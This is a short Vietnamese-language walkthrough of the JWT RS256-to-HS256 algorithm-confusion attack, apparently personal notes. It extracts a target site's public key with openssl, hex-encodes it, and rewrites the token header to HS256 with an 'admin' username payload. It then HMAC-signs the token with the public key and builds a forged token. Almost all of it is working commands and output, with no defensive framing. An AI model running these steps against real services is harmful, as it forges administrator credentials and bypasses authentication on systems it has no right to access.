JWT Attack Walk-Through - tấn công từ RSA
1: tai file cert từ trang web cần tấn công
2: chuyen tu certificate qua pemfile
openssl x509 -in cert.pem -pubkey –noout > key.pem
===
ket qua:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1+QERvcF10I8B/twZr34
x650u7pdqvhGtzbI8XTmxiIxn3aEjel5VRz9kxzmoOtuWzI8KzQ3yWN4y4C1DxNm
pg62fpRzJR7OXaMXKxqNXt0P1pREtEdlOizU9fNmbiVWdS19OgulABaK31s8k/VM
mQ8e7si9MqsyAxRoJnzlsiC5WznCXixUeSvx/nrj1xw96Lixp4CQ0z5lXDpwUkYd
r+e6Plz/W/Ep+j/yDuK7AK+hG70e9S45nO7Cpia/R/IJ7wca7GtzXeMTmCUJ76cP
q82WPRgIvMupsgazqyd00jSWrhJlNFIPWnTQa54E5lxByPiUGqSTtq9q1GQVELM0
pQIDAQAB
-----END PUBLIC KEY-----

3: tu file public key chuyen thanh ascii
cat key.pem | xxd -p | tr -d "\\n"
ket qua: 
2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541312b51455276634631304938422f74775a7233340a783635307537706471766847747a62493858546d786949786e3361456a656c3556527a396b787a6d6f4f7475577a49384b7a513379574e347934433144784e6d0a706736326670527a4a52374f58614d584b78714e58743050317052457445646c4f697a5539664e6d62695657645331394f67756c4142614b333173386b2f564d0a6d513865377369394d7173794178526f4a6e7a6c73694335577a6e4358697855655376782f6e726a31787739364c697870344351307a356c58447077556b59640a722b6536506c7a2f572f45702b6a2f7944754b37414b2b6847373065395334356e4f37437069612f522f494a377763613747747a58654d546d43554a373663500a7138325750526749764d75707367617a71796430306a535772684a6c4e464950576e545161353445356c784279506955477153547471397131475156454c4d300a70514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a

4: chuyen phan header cua jwt tu dang
{
  "alg": "RS256",
  "typ": "JWT"
}
thanh 
{
  "alg": "HS256",
  "typ": "JWT"
}
5: cong phan noi dung ta duocj dang sau:
ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ

6: tan cong ma
echo -n "ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541312b51455276634631304938422f74775a7233340a783635307537706471766847747a62493858546d786949786e3361456a656c3556527a396b787a6d6f4f7475577a49384b7a513379574e347934433144784e6d0a706736326670527a4a52374f58614d584b78714e58743050317052457445646c4f697a5539664e6d62695657645331394f67756c4142614b333173386b2f564d0a6d513865377369394d7173794178526f4a6e7a6c73694335577a6e4358697855655376782f6e726a31787739364c697870344351307a356c58447077556b59640a722b6536506c7a2f572f45702b6a2f7944754b37414b2b6847373065395334356e4f37437069612f522f494a377763613747747a58654d546d43554a373663500a7138325750526749764d75707367617a71796430306a535772684a6c4e464950576e545161353445356c784279506955477153547471397131475156454c4d300a70514944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
ket qua: 44bc3fd3fae3bda918ca14d5512cad7dd7d3d6402b1495fe60dcaeeac5501260

7: tao ma ky cho jwt
python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('44bc3fd3fae3bda918ca14d5512cad7dd7d3d6402b1495fe60dcaeeac5501260')).replace('=','')\")"
ket qua: RLw_0_rjvakYyhTVUSytfdfT1kArFJX-YNyu6sVQEmA
8: gan vao phan xac thuc cua jwt ta duoc:
ewogICJhbGciOiAiSFMyNTYiLAogICJ0eXAiOiAiSldUIgp9.ewogICJ1c2VybmFtZSI6ICJhZG1pbiIKfQ.RLw_0_rjvakYyhTVUSytfdfT1kArFJX-YNyu6sVQEmA
